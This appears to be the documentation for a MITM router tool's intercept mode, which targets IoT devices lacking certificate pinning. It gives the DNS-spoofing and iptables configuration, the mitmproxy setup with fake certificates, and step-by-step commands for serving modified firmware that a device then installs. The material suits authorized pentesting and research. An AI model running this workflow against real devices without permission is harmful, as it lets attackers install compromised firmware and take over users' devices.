# Intercept Mode - Exploiting Missing Certificate Pinning

Intercept mode is designed to exploit devices/applications that don't properly implement certificate pinning. Once you've identified such a vulnerability (e.g., using certmitm), you can use intercept mode to serve fake responses, such as modified firmware updates.

## How It Works

```
+----------------------------------------------------------------+
|                    Attack Flow (IoT Device Example)             |
+----------------------------------------------------------------+

1. Device connects to MITM router WiFi

2. Device queries DNS for api.example.com (to check for updates)
   -> dnsmasq returns REAL IP (NOT spoofed - passthrough domain)

3. Device connects directly to real api.example.com:443
   -> Real TLS certificate, connection works normally
   -> Real server returns: "download from update.example.com"

4. Device queries DNS for update.example.com
   -> dnsmasq returns 192.168.200.1 (spoofed - intercept domain)

5. Device connects to 192.168.200.1:443
   -> iptables redirects to mitmproxy
   -> mitmproxy sees update.example.com in INTERCEPT list

6. mitmproxy performs TLS handshake
   -> Presents fake certificate for update.example.com
   -> Device accepts (NO PINNING!)

7. mitmproxy forwards to fake server (HTTP)
   -> GET /app/1.2.3/firmware -> http://127.0.0.1:8443

8. Fake server returns modified firmware

9. Device installs compromised firmware
```

## Architecture

```
Device (IoT)
    |
    +--- PASSTHROUGH domains (api.example.com)
    |    -> DNS returns real IP (not spoofed)
    |    -> Device connects directly to real server
    |    -> Bypasses router entirely
    |
    +--- INTERCEPT domains (update.example.com)
         -> DNS spoofed to 192.168.200.1
         |
         v
+----------------------------------------------------------------+
|  MITM Router                                                    |
|                                                                 |
|  +----------------------------------------------------------+   |
|  |  iptables NAT PREROUTING                                 |   |
|  |  -d 192.168.200.1 port 443 -> redirect to mitmproxy      |   |
|  |  (only intercepts traffic TO router IP, not all HTTPS)   |   |
|  +----------------------------------------------------------+   |
|                              |                                  |
|                              v                                  |
|  +----------------------------------------------------------+   |
|  |  mitmproxy (port 8081) + mitmproxy-intercept.py addon    |   |
|  |                                                          |   |
|  |  1. Terminates TLS (presents fake certificate)           |   |
|  |  2. Device accepts (NO PINNING!)                         |   |
|  |  3. Forwards plaintext HTTP to fake server               |   |
|  +----------------------------------------------------------+   |
|                              |                                  |
|                              v                                  |
|                    +--------------------+                       |
|                    | Fake Server (:8443)|                       |
|                    |                    |                       |
|                    | Serves modified    |                       |
|                    | firmware           |                       |
|                    +--------------------+                       |
+----------------------------------------------------------------+
```

## Prerequisites

1. **Identify the vulnerability**: Use certmitm or manual testing to confirm the target doesn't validate certificates properly
2. **Prepare fake content**: Place your modified files in appropriate directory
3. **Configure DNS spoofing**: Add target domains to `dns-spoof.conf`

## Configuration

### 1. Edit mitm.conf

```bash
# Intercept Mode Settings
INTERCEPT_PORT="8081"                              # mitmproxy listen port
INTERCEPT_FAKE_SERVER_PORT="8443"                  # fake server port
INTERCEPT_FAKE_SERVER_SCRIPT="./fake-server.py"

# Domains to INTERCEPT (DNS spoofed, traffic sent to fake server)
INTERCEPT_DOMAINS="update.example.com"

# Domains to PASSTHROUGH (NOT DNS spoofed, traffic goes direct to real server)
# These domains bypass mitmproxy entirely - you won't see their traffic
INTERCEPT_PASSTHROUGH_DOMAINS="api.example.com"
```

### 2. Edit dns-spoof.conf

Add only INTERCEPT domains. Passthrough domains must NOT be listed here:

```bash
# Intercept domain only - traffic redirected to fake server
address=/update.example.com/192.168.200.1

# IMPORTANT: Do NOT add passthrough domains like api.example.com
# They must resolve to real IPs so traffic goes directly to real servers
```

**Why?** Passthrough domains need the client to see the real server's TLS certificate. If we DNS-spoof them to the router, mitmproxy would terminate TLS and present its own certificate, causing certificate errors.

### 3. Prepare content files

```bash
mkdir -p content/
cp /path/to/modified/file content/
```

## Usage

### Start intercept mode

```bash
sudo ./mitm.sh up -m intercept
```

### Monitor traffic

Open the mitmproxy web interface:
```
http://<WAN_IP>:8080
```

### View logs

```bash
# mitmproxy log
tail -f tmp_intercept.log

# Fake server log
tail -f tmp_fake_server.log
```

### Stop

```bash
sudo ./mitm.sh down
```

## Attack Workflow Example

### Step 1: Reconnaissance

```bash
# Start certmitm to test certificate validation
sudo ./mitm.sh up -m certmitm

# Connect target device to MITM router
# Trigger update check on device
# Check certmitm output for "VULNERABLE" indicators
```

### Step 2: Prepare modified content

```bash
# Download original content
curl -o content/original_file https://update.example.com/file

# Modify content as needed
# ... your modifications here ...

# Place in content directory
cp modified_file content/
```

### Step 3: Execute attack

```bash
# Start intercept mode
sudo ./mitm.sh up -m intercept

# Trigger update on device
# Device downloads YOUR content instead of legitimate files
```

### Step 4: Verify

- Check fake server logs for download requests
- Verify device received modified content
- Test modifications

## Customization

### Intercept vs Passthrough domains

Configure which domains to intercept vs let through:

```bash
# In mitm.conf:
# Domains sent to fake server (DNS spoofed, mitmproxy intercepts)
INTERCEPT_DOMAINS="update.example.com,cdn.example.com"

# Domains that bypass mitmproxy entirely (NOT DNS spoofed)
# Listed for documentation - do NOT add these to dns-spoof.conf
INTERCEPT_PASSTHROUGH_DOMAINS="api.example.com,auth.example.com"
```

```bash
# In dns-spoof.conf:
# ONLY intercept domains - passthrough domains must NOT be listed
address=/update.example.com/192.168.200.1
address=/cdn.example.com/192.168.200.1
# Do NOT add api.example.com or auth.example.com here!
```

**Key point**: Passthrough domains connect directly to real servers with real TLS certificates. They never touch mitmproxy, so you won't see their traffic.


### Modify mitmproxy-intercept.py

The addon script can be customized for advanced scenarios:

```python
def request(flow: http.HTTPFlow) -> None:
    # Add custom logic here
    if "firmware" in flow.request.path:
        # Log firmware requests specially
        ctx.log.warn(f"FIRMWARE REQUEST: {flow.request.pretty_url}")
```

## Troubleshooting

### Device rejects certificate

The device likely implements certificate pinning. Intercept mode won't work - you need to:
1. Find a way to disable pinning on the device
2. Install mitmproxy's CA on the device
3. Use a different attack vector

### No traffic intercepted

1. Check DNS spoofing: `dig update.example.com @192.168.200.1`
2. Check iptables rules: `iptables -t nat -L -n`
3. Verify device is connected to MITM router
4. Check mitmproxy is running: `pgrep mitmweb`

### Fake server not responding

1. Check fake server is running: `cat /tmp/mitm_fake_server.pid`
2. Test directly: `curl http://127.0.0.1:8443/`
3. Check logs: `cat tmp_fake_server.log`

### Passthrough domains not working

Passthrough works by NOT intercepting traffic to real IPs:
- DNS returns real IP (not spoofed) -> traffic goes to real server
- iptables only redirects traffic destined for router IP (192.168.200.1)
- Traffic to real IPs bypasses mitmproxy entirely

Troubleshooting:
1. Verify domain is NOT in dns-spoof.conf: `./dns-spoof.sh list`
2. Reload dnsmasq after config changes: `./dns-spoof.sh reload`
3. Test DNS resolution: `./dns-spoof.sh dump api.example.com`
   - Local should return real IP, not 192.168.200.1
4. Check iptables rule: `iptables -t nat -L PREROUTING -n`
   - Should show `-d 192.168.200.1` for intercept mode
5. Restart mitm if iptables rules are wrong: `sudo ./mitm.sh down && sudo ./mitm.sh up -m intercept`

## Security Considerations

This tool is intended for:
- Security research
- Penetration testing (with authorization)
- IoT device security assessments
- Educational purposes

**Never use against systems you don't own or have explicit permission to test.**

## Files

| File | Purpose |
|------|---------|
| `mitm.sh` | Main script with `-m intercept` mode |
| `mitmproxy-intercept.py` | mitmproxy addon for routing (intercept vs passthrough) |
| `dns-spoof.conf` | DNS spoofing configuration |
| `mitm.conf` | Configuration including `INTERCEPT_DOMAINS`, `INTERCEPT_PASSTHROUGH_DOMAINS` |
